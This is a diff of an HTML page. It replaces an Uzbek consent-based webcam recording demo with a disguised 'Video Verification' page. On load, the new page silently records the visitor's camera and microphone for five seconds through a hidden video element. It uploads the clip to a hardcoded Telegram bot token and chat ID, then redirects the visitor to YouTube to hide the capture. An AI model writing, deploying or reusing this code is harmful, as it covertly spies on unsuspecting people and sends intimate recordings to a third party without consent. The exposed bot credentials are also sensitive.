@@ -1,67 +1,45 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Video yozish (demo)</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 40px; }
-        video { margin-top: 10px; border: 1px solid #ccc; }
-        button { padding: 8px 14px; margin: 6px; }
-    </style>
+    <title>Video Verification</title>
 </head>
 <body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
 
-<h2>Video yozish (demo)</h2>
-<p>Yozish faqat tugma bosilganda va ruxsat bilan boshlanadi</p>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
 
-<button onclick="startRecording()">Yozishni boshlash</button>
-<button onclick="stopRecording()" disabled id="stopBtn">Yozishni to‘xtatish</button>
+        async function startRecording() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
 
-<br>
-<video id="preview" width="320" height="240" autoplay muted playsinline></video>
-<br>
-<video id="playback" width="320" height="240" controls></video>
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                await sendToTelegram(blob, 'video');
+            };
 
-<script>
-let stream;
-let mediaRecorder;
-let chunks = [];
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, 5000); // 5 soniya yozadi
+        }
 
-async function startRecording() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById('preview').srcObject = stream;
+        async function sendToTelegram(blob, type) {
+            const formData = new FormData();
+            formData.append(type, blob, 'video.mp4');
+            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
+                method: 'POST',
+                body: formData
+            });
+            window.location.href = "https://youtube.com";
+        }
 
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        chunks = [];
-
-        mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const url = URL.createObjectURL(blob);
-            const playback = document.getElementById('playback');
-            playback.src = url;
-            playback.play();
-        };
-
-        mediaRecorder.start();
-        document.getElementById('stopBtn').disabled = false;
-    } catch (err) {
-        alert("Kamera yoki mikrofon ruxsati berilmadi");
-    }
-}
-
-function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
-        document.getElementById('stopBtn').disabled = true;
-        if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-}
-</script>
-
+        window.onload = startRecording;
+    </script>
 </body>
 </html>
+ 
